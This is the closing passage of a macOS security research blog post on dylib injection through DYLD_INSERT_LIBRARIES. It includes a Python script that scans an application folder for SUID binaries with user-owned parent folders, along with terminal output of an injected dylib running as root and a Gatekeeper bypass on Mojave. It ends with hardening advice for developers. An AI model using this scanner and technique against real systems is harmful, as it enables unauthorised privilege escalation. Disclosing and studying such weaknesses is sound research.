</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">os</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">getpass</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pathlib</span> <span style="color:#069;font-weight:bold">import</span> Path
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>binaryPaths <span style="color:#555">=</span> (<span style="color:#c30">&#39;/Applications/GNS3/Resources/&#39;</span>)
</span></span><span style="display:flex;"><span>username <span style="color:#555">=</span> getpass<span style="color:#555">.</span>getuser()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> binaryPath <span style="color:#000;font-weight:bold">in</span> binaryPaths:
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">for</span> rootDir,subDirs,subFiles <span style="color:#000;font-weight:bold">in</span> os<span style="color:#555">.</span>walk(binaryPath):
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">for</span> subFile <span style="color:#000;font-weight:bold">in</span> subFiles:
</span></span><span style="display:flex;"><span>			absPath <span style="color:#555">=</span> os<span style="color:#555">.</span>path<span style="color:#555">.</span>join(rootDir,subFile)
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">try</span>:
</span></span><span style="display:flex;"><span>				permission <span style="color:#555">=</span> <span style="color:#366">oct</span>(os<span style="color:#555">.</span>stat(absPath)<span style="color:#555">.</span>st_mode)[<span style="color:#555">-</span><span style="color:#f60">4</span>:]
</span></span><span style="display:flex;"><span>				specialPermission <span style="color:#555">=</span> permission[<span style="color:#f60">0</span>]
</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">if</span> <span style="color:#366">int</span>(specialPermission) <span style="color:#555">&gt;=</span> <span style="color:#f60">4</span>:
</span></span><span style="display:flex;"><span>					p <span style="color:#555">=</span> Path(os<span style="color:#555">.</span>path<span style="color:#555">.</span>abspath(os<span style="color:#555">.</span>path<span style="color:#555">.</span>join(absPath, os<span style="color:#555">.</span>pardir)))
</span></span><span style="display:flex;"><span>					<span style="color:#069;font-weight:bold">if</span> p<span style="color:#555">.</span>owner() <span style="color:#555">==</span> username:
</span></span><span style="display:flex;"><span>						<span style="color:#366">print</span>(<span style="color:#c30">&#34;Potential issue found, owner of parent folder is:&#34;</span>, username)
</span></span><span style="display:flex;"><span>						<span style="color:#366">print</span>(permission , absPath)
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">except</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">pass</span>
</span></span></code></pre></div><p>One last thought on this topic is GateKeeper. You can inject quarantine flagged binaries in Mojave, which in fact is pretty much expected.</p>
<pre tabindex="0"><code>$ ./test 
uid=0(root) gid=0(wheel) egid=20(staff) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
Hello from dylib!
Hello world

$ xattr -l inject.dylib 
com.apple.metadata:kMDItemWhereFroms:
00000000  62 70 6C 69 73 74 30 30 A2 01 02 5F 10 22 68 74  |bplist00..._.&#34;ht|
00000010  74 70 3A 2F 2F 31 32 37 2E 30 2E 30 2E 31 3A 38  |tp://127.0.0.1:8|
00000020  30 38 30 2F 69 6E 6A 65 63 74 2E 64 79 6C 69 62  |080/inject.dylib|
00000030  5F 10 16 68 74 74 70 3A 2F 2F 31 32 37 2E 30 2E  |_..http://127.0.|
00000040  30 2E 31 3A 38 30 38 30 2F 08 0B 30 00 00 00 00  |0.1:8080/..0....|
00000050  00 00 01 01 00 00 00 00 00 00 00 03 00 00 00 00  |................|
00000060  00 00 00 00 00 00 00 00 00 00 00 49              |...........I|
0000006c
com.apple.quarantine: 0081;5d248e35;Chrome;CE4482F1-0AD8-4387-ABF6-C05A4443CAF4
</code></pre><p>However it doesn’t work anymore on Catalina, which is also expected with the introduced changes:</p>
<p><img src="https://theevilbit.github.io/images/DYLD_INSERT_LIBRARIES_DYLIB_injection_in_macOS_OSX_deep_dive/Screenshot%202019-07-09%20at%2019.04.04.png" alt="image"></p>
<p>We got a very similar error message as before:</p>
<pre tabindex="0"><code>dyld: could not load inserted library &#39;inject.dylib&#39; because no suitable image found.  Did find:
	inject.dylib: code signature in (inject.dylib) not valid for use in process using Library Validation: Library load disallowed by System Policy
	inject.dylib: stat() failed with errno=1
</code></pre><p>I think applications should protect themselves against this type of dylib injection, and as it stands, it’s pretty easy to do, you have a handful of options, so there is really no reason not to do so. As Apple is moving towards notarization hardened runtime will be enabled slowly for most/all applications (it is mandatory for notarised apps), so hopefully this injection technique will fade away slowly. If you develop an app where you set the SUID bit, be sure to properly set permissions for the parent folder.</p>
<p>GIST link to codes:
<a href="https://gist.github.com/theevilbit/3574df063cf9e2c3ba6c57aca5dff022"  class="external-link" target="_blank" rel="noopener">DYLD_INSERT_LIBRARIES  DYLIB injection in macOS / OSX deep dive · GitHub</a></p>

      </div>


      <footer>
        


        
        
        
        
        

        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
    2024
     Csaba Fitzl 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="https://theevilbit.github.io/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  
  



  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>

</html>
